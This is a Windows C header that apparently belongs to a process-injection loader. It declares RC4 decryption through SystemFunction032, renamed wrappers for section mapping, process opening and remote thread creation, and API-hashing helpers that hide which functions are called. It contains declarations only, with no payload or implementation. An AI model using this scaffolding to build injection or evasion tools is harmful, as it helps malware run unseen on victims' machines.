#pragma once

#include <Windows.h>
#include <stdio.h>


typedef struct {
	DWORD Length;
	DWORD MaximumLength;
	PVOID Buffer;
} USTRING;

// declare the function prototype
typedef NTSTATUS(NTAPI* fnSystemFunction032) (
	struct USTRING* data,
	struct USTRING* key
	);


typedef enum _SECTION_INHERIT {
	ViewShare = 1,
	ViewUnmap = 2
} SECTION_INHERIT, * PSECTION_INHERIT;



typedef struct _UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	PWSTR  Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES
{
	ULONG Length;
	PVOID RootDirectory;
	PUNICODE_STRING ObjectName;
	ULONG Attributes;
	PVOID SecurityDescriptor;
	PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;

typedef struct _CLIENT_ID
{
	PVOID UniqueProcess;
	PVOID UniqueThread;
} CLIENT_ID, * PCLIENT_ID;




extern NTSTATUS P_CreateSec(
	_Out_          PHANDLE            SectionHandle,
	_In_           ACCESS_MASK        DesiredAccess,
	_In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
	_In_opt_ PLARGE_INTEGER     MaximumSize,
	_In_           ULONG              SectionPageProtection,
	_In_           ULONG              AllocationAttributes,
	_In_opt_ HANDLE             FileHandle
);

extern  NTSTATUS P_MapView(
	HANDLE SectionHandle,
	HANDLE ProcessHandle,
	PVOID* BaseAddress,
	ULONG_PTR ZeroBits,
	SIZE_T CommitSize,
	PLARGE_INTEGER SectionOffset,
	PSIZE_T ViewSize,
	DWORD InheritDisposition,
	ULONG AllocationType,
	ULONG Win32Protect);


extern NTSTATUS P_Open(
	_Out_         PHANDLE            ProcessHandle,
	_In_          ACCESS_MASK        DesiredAccess,
	_In_           POBJECT_ATTRIBUTES ObjectAttributes,
	_In_opt_ PCLIENT_ID         ClientId
);

extern NTSTATUS P_CreateThread(
	OUT PHANDLE hThread,
	IN ACCESS_MASK DesiredAccess,
	IN PVOID ObjectAttributes,
	IN HANDLE ProcessHandle,
	IN PVOID lpStartAddress,
	IN PVOID lpParameter,
	IN ULONG Flags,
	IN SIZE_T StackZeroBits,
	IN SIZE_T SizeOfStackCommit,
	IN SIZE_T SizeOfStackReserve,
	OUT PVOID lpBytesBuffer
);



FARPROC CProc(IN HMODULE ndll, IN DWORD hshed);
UINT32 hshW(IN PWCHAR str);
HMODULE CustomGetHandle1(IN DWORD hsh);